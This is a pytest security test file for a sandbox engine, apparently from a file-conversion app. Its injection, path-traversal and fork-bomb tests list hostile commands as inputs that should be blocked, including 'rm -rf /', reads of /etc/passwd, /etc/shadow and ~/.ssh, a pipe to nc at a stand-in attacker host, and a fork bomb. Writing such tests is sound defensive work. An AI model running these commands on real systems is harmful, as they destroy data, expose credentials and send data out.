"""Security tests for process isolation verification."""

import os
import subprocess
import tempfile
from unittest.mock import MagicMock, Mock, patch

import pytest

from app.core.security.engine import SecurityEngine
from app.core.security.errors import SecurityError
from app.core.security.sandbox import SecuritySandbox


class TestProcessIsolation:
    """Test suite for verifying process isolation security."""

    @pytest.fixture
    def security_engine(self):
        """Create SecurityEngine instance for testing."""
        return SecurityEngine()

    @pytest.fixture
    def sandbox(self):
        """Create a sandbox instance for testing."""
        engine = SecurityEngine()
        return engine.create_sandbox(
            conversion_id="test-conversion-123", strictness="strict"
        )

    @pytest.mark.asyncio
    async def test_network_isolation_verification(self, security_engine, sandbox):
        """Test that network isolation is properly verified."""
        # Mock execute_sandboxed to simulate blocked network
        with patch.object(sandbox, "execute_sandboxed") as mock_exec:
            mock_exec.side_effect = SecurityError("Forbidden command: ping")

            # Verify network isolation
            result = await security_engine.verify_process_isolation(sandbox)

            assert result["network_isolated"] is True

    @pytest.mark.asyncio
    async def test_filesystem_restriction_verification(self, security_engine, sandbox):
        """Test that filesystem restrictions are properly verified."""
        # Mock execute_sandboxed to simulate blocked filesystem access
        with patch.object(sandbox, "execute_sandboxed") as mock_exec:
            mock_exec.side_effect = SecurityError("Forbidden command: cat")

            # Verify filesystem restrictions
            result = await security_engine.verify_process_isolation(sandbox)

            assert result["filesystem_restricted"] is True

    @pytest.mark.asyncio
    async def test_resource_limits_verification(self, security_engine, sandbox):
        """Test that resource limits are properly verified."""
        # Mock execute_sandboxed to simulate memory limit enforcement
        with patch.object(sandbox, "execute_sandboxed") as mock_exec:
            mock_exec.side_effect = MemoryError("Memory limit exceeded")

            # Verify resource limits
            result = await security_engine.verify_process_isolation(sandbox)

            assert result["resource_limits_enforced"] is True

    @pytest.mark.asyncio
    async def test_environment_sanitization_verification(
        self, security_engine, sandbox
    ):
        """Test that environment variables are properly sanitized."""
        # Mock execute_sandboxed to return clean environment
        with patch.object(sandbox, "execute_sandboxed") as mock_exec:
            mock_exec.return_value = {
                "output": b"PATH=/usr/bin:/bin\nLANG=C\n",
                "stderr": b"",
                "returncode": 0,
            }

            # Verify environment sanitization
            result = await security_engine.verify_process_isolation(sandbox)

            assert result["environment_sanitized"] is True

    def test_sandbox_blocks_shell_injection(self, sandbox):
        """Test that sandbox blocks shell injection attempts."""
        injection_commands = [
            ["echo", "test; rm -rf /"],
            ["echo", "test && cat /etc/passwd"],
            ["echo", "test | nc attacker.com 4444"],
            ["sh", "-c", "malicious_script.sh"],
        ]

        for cmd in injection_commands:
            with pytest.raises(SecurityError):
                sandbox.validate_command(cmd)

    def test_sandbox_blocks_path_traversal_in_commands(self, sandbox):
        """Test that sandbox blocks path traversal in command arguments."""
        traversal_commands = [
            ["cat", "../../../etc/passwd"],
            ["cp", "/etc/shadow", "."],
            ["ls", "/root/.ssh/"],
        ]

        for cmd in traversal_commands:
            # Should either raise SecurityError or fail in execution
            try:
                result = sandbox.execute_sandboxed(command=cmd, timeout=1)
                assert result["returncode"] != 0  # Command should fail
            except (SecurityError, TimeoutError):
                pass  # Expected

    @pytest.mark.asyncio
    async def test_security_violations_are_tracked(self, security_engine):
        """Test that security violations are properly tracked."""
        conversion_id = "test-track-violations"
        sandbox = security_engine.create_sandbox(conversion_id)

        # Attempt to execute forbidden command
        with pytest.raises(SecurityError):
            await security_engine.execute_sandboxed_conversion(
                sandbox=sandbox,
                conversion_id=conversion_id,
                command=["rm", "-rf", "/"],
            )

        # Check that violation was recorded
        process_sandbox = security_engine._sandboxes.get(conversion_id)
        assert process_sandbox is not None
        assert process_sandbox.security_violations > 0

    def test_sandbox_resource_usage_tracking(self, sandbox):
        """Test that resource usage is properly tracked."""
        with patch("subprocess.Popen") as mock_popen:
            # Setup mock process
            mock_process = Mock()
            mock_process.communicate.return_value = (b"output", b"")
            mock_process.returncode = 0
            mock_process.pid = 12345
            mock_process.poll.return_value = 0
            mock_popen.return_value = mock_process

            # Mock resource usage reading
            with patch.object(sandbox, "_get_process_resource_usage") as mock_usage:
                mock_usage.return_value = {"memory_mb": 45.5, "cpu_time": 1.2}

                result = sandbox.execute_sandboxed(command=["echo", "test"], timeout=5)

                assert result["memory_used_mb"] == 45.5
                assert result["cpu_time"] == 1.2
                assert result["wall_time"] > 0

    def test_sandbox_prevents_fork_bombs(self, sandbox):
        """Test that sandbox prevents fork bomb attacks."""
        # Fork bomb command
        fork_bomb_cmd = ["sh", "-c", ":(){ :|: & };:"]

        with pytest.raises(SecurityError, match="Forbidden command"):
            sandbox.validate_command(fork_bomb_cmd)

    def test_sandbox_cleanup_after_crash(self, security_engine):
        """Test that sandbox properly cleans up after process crash."""
        conversion_id = "test-crash-cleanup"
        sandbox = security_engine.create_sandbox(conversion_id)

        # Simulate process crash
        with patch("subprocess.Popen") as mock_popen:
            mock_process = Mock()
            mock_process.communicate.side_effect = Exception("Process crashed")
            mock_process.pid = 12345
            mock_process.poll.return_value = None
            mock_process.kill = Mock()
            mock_popen.return_value = mock_process

            with pytest.raises(Exception):
                sandbox.execute_sandboxed(command=["test"])

            # Verify kill was called
            mock_process.kill.assert_called()

        # Cleanup sandbox
        security_engine.cleanup_sandbox(conversion_id)

        # Verify sandbox was removed from tracking
        assert conversion_id not in security_engine._sandboxes

    @pytest.mark.asyncio
    async def test_concurrent_sandbox_isolation(self, security_engine):
        """Test that multiple sandboxes are properly isolated from each other."""
        import asyncio

        async def run_sandbox(conversion_id: str, delay: float):
            """Run a sandbox with a specific delay."""
            sandbox = security_engine.create_sandbox(conversion_id)

            with patch.object(sandbox, "execute_sandboxed") as mock_exec:
                mock_exec.return_value = {
                    "output": f"sandbox_{conversion_id}".encode(),
                    "stderr": b"",
                    "returncode": 0,
                    "process_id": hash(conversion_id),
                    "memory_used_mb": 10,
                    "cpu_time": delay,
                    "wall_time": delay,
                }

                await asyncio.sleep(delay)

                result, process_sandbox = (
                    await security_engine.execute_sandboxed_conversion(
                        sandbox=sandbox,
                        conversion_id=conversion_id,
                        command=["echo", conversion_id],
                    )
                )

                return conversion_id, result

        # Run multiple sandboxes concurrently
        tasks = [
            run_sandbox("sandbox1", 0.1),
            run_sandbox("sandbox2", 0.05),
            run_sandbox("sandbox3", 0.15),
        ]

        results = await asyncio.gather(*tasks)

        # Verify each sandbox produced correct output
        for conv_id, output in results:
            assert f"sandbox_{conv_id}".encode() == output

        # Verify all sandboxes were tracked separately
        assert len(security_engine._sandboxes) == 3

    def test_sandbox_audit_log_privacy(self, security_engine):
        """Test that audit logs don't contain sensitive information."""
        conversion_id = "test-privacy"
        sandbox = security_engine.create_sandbox(conversion_id)

        # Create process sandbox with sensitive data
        process_sandbox = security_engine._sandboxes[conversion_id]
        process_sandbox.mark_completed(
            exit_code=0,
            actual_usage={"memory_mb": 50, "cpu_time": 1.5},
            error_message="Failed to process /home/user/private_photo.jpg",
        )

        # Get audit log
        audit_log = process_sandbox.to_audit_log()

        # Verify no sensitive data in audit log
        log_str = str(audit_log)
        assert "/home/user/private_photo.jpg" not in log_str
        assert "private_photo" not in log_str
        assert audit_log["sandbox_id"] == process_sandbox.id
        assert audit_log["was_successful"] is True
        assert audit_log["memory_mb"] not in log_str  # Should be in actual_usage

    def test_sandbox_file_size_limits(self, sandbox):
        """Test that sandbox enforces output file size limits."""
        with patch("subprocess.Popen") as mock_popen:
            # Create large output that exceeds limit
            large_output = b"X" * (101 * 1024 * 1024)  # 101MB

            mock_process = Mock()
            mock_process.communicate.return_value = (large_output, b"")
            mock_process.returncode = 0
            mock_process.pid = 12345
            mock_popen.return_value = mock_process

            with pytest.raises(ValueError, match="Output too large"):
                sandbox.execute_sandboxed(
                    command=["generate_large_output"], max_output_size_mb=100
                )
